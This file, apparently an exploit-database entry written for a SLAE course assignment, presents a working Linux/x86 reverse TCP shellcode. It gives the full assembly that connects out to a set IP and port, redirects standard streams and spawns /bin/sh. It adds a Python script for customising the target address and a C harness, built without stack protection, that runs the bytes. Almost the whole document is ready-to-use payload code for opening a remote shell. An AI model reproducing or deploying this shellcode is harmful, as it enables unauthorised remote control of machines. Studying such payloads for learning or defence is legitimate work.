@@ -1,0 +1,205 @@
+id: 35582
+date: 01/01/2021
+title: Linux/x86 Reverse TCP Shellcode (114 bytes)
+author: Stylianos Voukatas
+cves: 
+
+; Title: Linux/x86 - Reverse TCP Shellcode ( 114 bytes )
+; Author:   Stylianos Voukatas
+; Website:  https://vostdev.wordpress.com/
+; Date:   2020-12-30
+; Tested on: Linux ubuntu 5.4.0-42-generic #46~18.04.1-Ubuntu x86_64
+; 
+; Purpose:  Assignment 2 for SLAE
+; SLAE:     http://securitytube-training.com/onlinecourses/securitytube-linux-assembly-expert/
+
+; Student ID: PA-27669
+;
+; Shellcode-length: 114
+
+;-------------------------------------- ASM --------------------------------------
+
+global _start      
+
+section .text
+_start:
+
+  ; set registers  to zero
+  xor eax, eax
+  xor ebx, ebx
+  xor ecx, ecx
+  xor edx, edx
+  
+  ;socket section
+  mov ax, 0x167  ; set num for socket interrupt
+  mov bl, 0x02  ; set domain IPv4 Protocol, try also 0x00 for both v4 and v6, also one less instruction
+  mov cl, 0x01  ; set type
+  ; edx is zero    ; set protocol, leave it 0 so it will select on its own based on the type
+
+  int 0x80  ; interrupt for socket()
+
+
+  ; eax will hold our file descriptor (fd)
+  mov esi, eax  ; store fd  
+
+; connect section
+  
+    ; construct the struct sockaddr_in
+
+  ; prepare eax for ip addr XOR, set a mask
+  mov eax, 0xffffffff
+  push edx  ; padding 4 bytes
+  push edx  ; padding 4 bytes
+
+  ; address 192.168.1.12 is in little endian 0xc01a8c0
+  ; we XOR the address using a mask of 0xffffffff and we get 0xf3fe573f
+  ; in order to restore the initial value we need to XOR again with the mask
+  ; this is done to avoid null characters in case our ip addr contain 0
+  xor eax, 0xf3fe573f 
+  push eax  ; address field, set to 192.168.1.12, in little endian format 
+
+
+  ; same convertion for the port number
+  
+  mov eax, 0xffffffff
+  xor ax, 0xc6fa  ; port number 1337 after mask applied in little endian
+  push ax
+  push word 0x02  ; address family
+
+  mov ecx, esp  ; save the struct address in stack
+
+  mov dl, 0x10  ; size of struct, 16 bytes (padding + address + port + family)
+
+  mov ebx, esi  ; set fd
+
+  xor eax, eax
+  mov ax, 0x016a  ; set num for bind interrupt
+
+  int 0x80
+
+  ; check if connect succeed
+
+  test eax, eax  ; if not zero then an error occured
+  jnz exit  
+
+
+  ; dup2 section
+  xor ecx, ecx
+  mov cl, 0x3  ; prepare for loop
+  xor eax, eax
+
+
+dup_loop:
+      ; ebx has the fd from the previous call
+      ; duplicate fd for stdin, stdout, stderr
+  mov al, 0x3f
+  
+  dec cl
+  int 0x80
+  
+  jnz dup_loop
+
+
+  ; execve section
+
+  xor eax, eax
+  
+  push eax  ; push \0 in stack
+
+  ; /bin//sh  
+  push 0x68732f2f
+  push 0x6e69622f
+
+  mov ebx, esp
+
+  push eax  ; push 0 in stack
+  mov edx, esp
+
+  push ebp  ; push the address of /bin//sh in stack
+
+  mov ecx, esp  ; put the address of args in ecx
+
+
+  mov al, 0xb
+  int 0x80
+
+
+exit:
+
+  xor eax, eax
+  xor ebx, ebx
+  mov al, 0x01
+  mov bl, 0x07  ; just a random number as an exit code :)
+  
+  int 0x80
+
+;-------------------------------------- ASM --------------------------------------
+
+Script to automaticaly produce the shellcode, set ip and port
+
+;-------------------------------------- Python -----------------------------------
+#!/usr/bin/python
+
+from operator import xor
+
+
+# set ip and port
+ip = "192.168.1.12"
+#port = "31337"
+#ip = '127.0.0.1'
+port = '8888'
+
+
+ip_in_xored_bytes = ''
+port_in_xored_bytes = ''
+
+
+shell_code_1 = "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc6\\xb8\\xff\\xff\\xff\\xff\\x52\\x52\\x35"
+
+#ip
+
+shell_code_2 = "\\x50\\xb8\\xff\\xff\\xff\\xff\\x66\\x35"
+
+#port
+
+shell_code_3 = "\\x66\\x50\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x89\\xf3\\x31\\xc0\\x66\\xb8\\x6a\\x01\\xcd\\x80\\x85\\xc0\\x75\\x27\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\xfe\\xc9\\xcd\\x80\\x75\\xf8\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x55\\x89\\xe1\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x31\\xdb\\xb0\\x01\\xb3\\x07\\xcd\\x80"
+
+for byte in ip.split("."):
+        ip_in_xored_bytes += "\\x" + "{:x}".format(xor(int(byte),0xff))
+
+
+port_in_xored_bytes += "{:04x}".format(xor(int(port),0xffff))
+port_xored_formated = "\\x" + port_in_xored_bytes[:2] + "\\x" + port_in_xored_bytes[2:]
+
+print "ip:", ip
+print "xored ip: ", ip_in_xored_bytes
+print "port:", port
+print "xored port: ", port_xored_formated
+print ""
+shell_code = shell_code_1 + ip_in_xored_bytes + shell_code_2 + port_xored_formated + shell_code_3
+print "ShellCode:"
+print shell_code
+
+;-------------------------------------- Python ------------------------------------
+
+C program to test the payload
+gcc shellcode.c -o shellcode -fno-stack-protector -z execstack -m32
+
+;-------------------------------------- Paylod test -------------------------------
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc6\xb8\xff\xff\xff\xff\x52\x52\x35\x3f\x57\xfe\xf3\x50\xb8\xff\xff\xff\xff\x66\x35\xdd\x47\x66\x50\x66\x6a\x02\x89\xe1\xb2\x10\x89\xf3\x31\xc0\x66\xb8\x6a\x01\xcd\x80\x85\xc0\x75\x27\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf8\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x55\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x07\xcd\x80";
+main()
+{
+
+  printf("Shellcode Length:  %d\n", strlen(code));
+
+  int (*ret)() = (int(*)())code;
+
+  ret();
+
+}
+
+#  0day.today [2023-03-22]  #
